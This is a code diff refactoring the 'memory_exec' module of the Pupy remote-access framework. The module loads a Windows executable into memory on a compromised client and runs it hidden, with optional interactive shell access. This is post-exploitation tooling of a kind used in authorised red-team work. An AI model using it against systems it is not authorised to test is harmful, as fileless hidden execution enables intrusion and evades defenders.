@@ -35,8 +35,8 @@ class MemoryExec(PupyModule):
 		self.mp=None
 	def init_argparse(self):
 		self.arg_parser = PupyArgumentParser(prog="memory_exec", description=self.__doc__)
-		self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
-		self.arg_parser.add_argument('--fork', action='store_true', help='fork and do not wait for the child program. stdout will not be retrieved', completer=path_completer)
+		#self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
+		self.arg_parser.add_argument('--fork', action='store_true', help='fork and do not wait for the child program. stdout will not be retrieved')
 		self.arg_parser.add_argument('-i', '--interactive', action='store_true', help='interact with the process stdin.')
 		self.arg_parser.add_argument('--timeout', metavar='<timeout>', type=float, help='kill the program after <timeout> seconds if it didn\'t exit on its own')
 		self.arg_parser.add_argument('path', help='path to the exe', completer=path_completer)
@@ -49,36 +49,29 @@ class MemoryExec(PupyModule):
 			res=self.mp.get_stdout()
 			self.log(res)
 
-	def run(self, args):
-		if args.fork and args.interactive:
-			self.error("--fork and --interactive options can't be used together")
-			return
 
-		#check we are injecting from the good process arch:
-		pe_arch=get_pe_arch(args.path)
+	def exec_pe(self, path, prog_args, interactive=False, fork=False, timeout=None):
+		pe_arch=get_pe_arch(path)
 		proc_arch=self.client.desc["proc_arch"]
 		if pe_arch!=proc_arch:
-			self.error("%s is a %s PE and your pupy payload is a %s process. Please inject a %s PE or migrate into a %s process first"%(args.path, pe_arch, proc_arch, proc_arch, pe_arch))
+			self.error("%s is a %s PE and your pupy payload is a %s process. Please inject a %s PE or migrate into a %s process first"%(path, pe_arch, proc_arch, proc_arch, pe_arch))
 			return
-
 		wait=True
 		redirect_stdio=True
-		if args.fork:
+		if fork:
 			wait=False
 			redirect_stdio=False
-
 		raw_pe=b""
-		with open(args.path,'rb') as f:
+		with open(path,'rb') as f:
 			raw_pe=f.read()
-
 		self.client.load_package("pupymemexec")
 		self.client.load_package("pupwinutils.memexec")
 
 		res=""
-		self.mp=self.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=args.args, hidden=True, redirect_stdio=redirect_stdio)
+		self.mp=self.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=prog_args, hidden=True, redirect_stdio=redirect_stdio)
 		self.mp.run()
-		if not args.fork:
-			if args.interactive:
+		if not fork:
+			if interactive:
 				try:
 					with redirected_stdio(self.client.conn):
 						self.mp.get_shell()
@@ -89,11 +82,15 @@ class MemoryExec(PupyModule):
 				while True:
 					if self.mp.wait(1):
 						break
-					if args.timeout:
-						if time.time()-starttime>args.timeout:
+					if timeout:
+						if time.time()-starttime>timeout:
 							break
 				self.mp.close()
 				res=self.mp.get_stdout()
 				self.log(res)
 				
+
+
+	def run(self, args):
+		self.exec_pe(args.path, args.args, interactive=args.interactive, fork=args.fork, timeout=args.timeout)
 
